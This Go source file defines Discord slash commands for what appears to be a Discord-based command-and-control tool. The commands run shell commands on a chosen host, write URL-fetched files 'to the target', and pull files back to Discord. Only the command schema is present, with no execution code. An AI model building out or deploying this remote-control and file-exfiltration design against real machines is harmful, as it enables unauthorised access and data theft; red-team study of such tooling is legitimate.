package main

import (
	"github.com/bwmarrin/discordgo"
)

var Commands = []*discordgo.ApplicationCommand{
	// Creates the structure of the command
	{
		Name:        "basic-command",
		Description: "simple command for testing",
	},
	// Creates the structure of execute-command
	{
		Name:        "execute-command",
		Description: "Execute command in the host",
		// Creates the command options inside execute-command
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "host_id",
				Description: "The host id of the bot you want to run the command into",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "command",
				Description: "The command to execute",
				Required:    true,
			},
		},
	},
	// Creates the structure of the upload command
	{
		Name:        "upload",
		Description: "Upload a file to the host",
		// Creates the command options inside upload
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "host_id",
				Description: "The host id of the bot you want to run the command into",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "filename",
				Description: "The name of the file including its path to write to",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "file_to_upload",
				Description: "The URL link of the file to upload to the target",
				Required:    true,
			},
		},
	},

	{
		Name:        "download",
		Description: "Download a file from the host and upload it to discord (10mb limit)",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "host_id",
				Description: "The host id of the bot you want to run the command into",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "filename",
				Description: "The name of the file including the path",
				Required:    true,
			},
		},
	},
}
